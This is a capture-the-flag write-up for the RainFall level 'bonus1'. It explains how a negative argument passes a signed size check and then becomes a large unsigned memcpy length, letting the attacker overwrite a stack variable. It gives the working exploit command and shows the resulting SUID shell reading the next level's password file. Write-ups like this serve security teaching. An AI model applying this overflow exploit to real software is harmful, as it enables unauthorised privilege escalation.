The program begins by doing an atoi of argv[1]:
 804842d:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048430:	83 c0 04             	add    eax,0x4
 8048433:	8b 00                	mov    eax,DWORD PTR [eax]
 8048435:	89 04 24             	mov    DWORD PTR [esp],eax
 8048438:	e8 23 ff ff ff       	call   8048360 <atoi@plt>
 804843d:	89 44 24 3c          	mov    DWORD PTR [esp+0x3c],eax
 8048441:	83 7c 24 3c 09       	cmp    DWORD PTR [esp+0x3c],0x9
 8048446:	7e 07                	jle    804844f <main+0x2b>
It puts the value returned by atoi on the stack at $esp+0x3c. Let's name it nbytes.
It then jump to the end of main if nbytes is not less then or equal to 9.

It then does a memcpy to a buffer on the stack located at $esp+20 with argv[2] of (nbytes * 4) bytes. $esp+0x14 is lower then $esp+0x3c, which means the buffer is below (in addresses) nbytes.

memcpy takes a size_t (which is an unsigned integer type) instead of an int, so we can put a negative value in decimal as first parameter of the program, the memcpy will interpret it as a unsigned integer, which means our value will be used as a positive value.
The program multiplies our value by 4 (as an unsigned value) before giving it to memcpy.

It then tests if nbytes is equal to 0x574f4c46 and if it is, the flow continues to a excl that calls a shell for us.

So we need to find a negative number that as interpreted as unsigned int and multiplied by 4 gives us a sufficient number of copied bytes from argv[2] so that nbytes (on the stack) is overwriting with the value 0x574f4c46 which is 'FLOW' in ascii.

$ bc
bc 1.07.1
Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006, 2008, 2012-2017 Free Software Foundation, Inc.
This is free software with ABSOLUTELY NO WARRANTY.
For details type `warranty'. 
ibase=10
obase=2
200
11001000
200/4
110010
obase=10
ibase=2
10000000000000000000000000110010 # set the highest bit to 1 to get a negative signed integer
2147483698

$ gdb
For help, type "help".
Type "apropos word" to search for commands related to "word".
(gdb) print (int)2147483698
$1 = -2147483598
(gdb) print (int)2147483698 * 4
$2 = 200


Finally we do:
./bonus1 -2147483598  "`python -c 'import sys; sys.stdout.write("FLOW" * 400)'`"
and we get a SUID-shell.

bonus1@RainFall:~$ ./bonus1 -2147483598  "`python -c 'import sys; sys.stdout.write("FLOW" * 400)'`"
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
